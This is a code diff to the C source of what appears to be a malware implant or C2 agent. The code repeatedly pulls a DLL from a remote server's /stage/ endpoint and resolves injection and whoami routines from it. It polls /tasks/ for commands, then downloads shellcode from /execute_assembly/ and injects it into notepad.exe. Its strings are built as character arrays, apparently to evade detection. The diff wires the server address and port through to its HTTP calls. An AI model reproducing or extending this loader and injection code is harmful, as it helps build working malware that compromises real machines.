@@ -268,13 +268,18 @@ void myMain()
     PDLL pEsgStdDll = &esgStdDll;
     pEsgStdDll->Buffer = NULL;
 
+    WCHAR wServer[] = { SERVER_M } ;
+    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
+    WCHAR uuid[] = { UUID_M } ;
+    INTERNET_PORT port = PORT_M;
+
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
     while (pEsgStdDll->Buffer == NULL)
     {
-        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint, );
+        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
         ((SLEEP)api->Sleep)(5000);
         if (pEsgStdDll->Buffer != NULL)
         { break; }
@@ -296,15 +301,8 @@ void myMain()
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, whoami_c);
     PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, injectIntoProcess_c);
 
-    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
-    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
-    WCHAR wServer[] = { SERVER_M } ;
-    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
-    //WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
-    WCHAR uuid[] = { UUID_M } ;
     //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
     WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
-    INTERNET_PORT port = PORT_M;
 
     CHAR* jsonResponse = NULL;
     CHAR* taskId = { 0 };
@@ -417,7 +415,7 @@ void myMain()
             CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-            LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
+            LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
             CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
         }
